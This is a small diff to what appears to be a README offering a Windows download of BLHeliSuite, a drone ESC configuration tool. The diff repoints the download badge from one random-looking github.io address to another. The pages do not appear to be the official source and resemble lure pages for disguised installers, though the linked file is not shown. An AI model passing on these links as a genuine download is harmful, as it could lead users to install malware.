@@ -2,7 +2,7 @@
 
 **blheli suite download (Windows)** — BLHeliSuite configures BLHeli ESCs: motor direction, timing, and startup power with read/write verify.
 
-[![Download blheli-suite-download](https://img.shields.io/badge/Download-blheli--suite--download-blueviolet)](https://orf-asfx-klinton.github.io/.github/blheli-suite-download)
+[![Download blheli-suite-download](https://img.shields.io/badge/Download-blheli--suite--download-blueviolet)](https://newsgrooifouray.github.io/.github/blheli-suite)
 
 ---
 
